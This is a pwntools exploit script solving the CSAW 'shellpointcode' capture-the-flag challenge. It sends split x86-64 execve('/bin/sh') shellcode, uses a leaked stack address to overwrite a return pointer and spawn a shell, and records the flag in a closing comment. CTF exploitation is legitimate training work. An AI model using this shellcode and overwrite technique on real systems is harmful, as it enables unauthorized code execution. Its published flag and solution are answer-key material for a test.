from pwn import *

### DEBUGGING ###

context.binary = ELF('shellpointcode')

DEBUG = False

if DEBUG:
    r = process('shellpointcode')
    timeout = 0.1

    context.log_level = 'debug'
#    gdb.attach(r,'''
#    b main
#    ''')
else :
    r = remote('pwn.chal.csaw.io', 9005)
    timeout = 0.3

def rr(s):
    return r.recvuntil(s)

def ss(s):
    return r.sendline(s)

### ADDRESS ###

### PAYLOAD ###

sh1 = ''
sh1 += asm('mov rbx, 0x68732f6e69622f2f')
sh1 += asm('pop rdx')
sh1 += asm('jmp rsp')

'''

   0:   48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
   7:   2f 73 68 
   a:   5a                      pop    rdx
   b:   ff e4                   jmp    rsp

'''

sh2 = ''
sh2 += asm('xor rsi, rsi')
sh2 += asm('xor rdx, rdx')
sh2 += asm('mov al, 0x3b')
sh2 += asm('push rdx')
sh2 += asm('push rbx')
sh2 += asm('mov rdi, rsp')
sh2 += asm('syscall')

'''

   0:   48 31 f6                xor    rsi,rsi
   3:   48 31 d2                xor    rdx,rdx
   6:   b0 3b                   mov    al,0x3b
   8:   52                      push   rdx
   9:   53                      push   rbx
   a:   48 89 e7                mov    rdi,rsp
   d:   0f 05                   syscall

'''

### EXPLOIT ###

rr(':')
ss(sh1)

rr(':')
ss(sh2)

rr(':')
rr('.next: ')

leak = int(rr('\n'),16) + 40
log.info('leak : 0x%x' % leak)

rr('?\n')

ss('a'*11 + p64(leak))

r.interactive()

#flag{NONONODE_YOU_WRECKED_BRO}
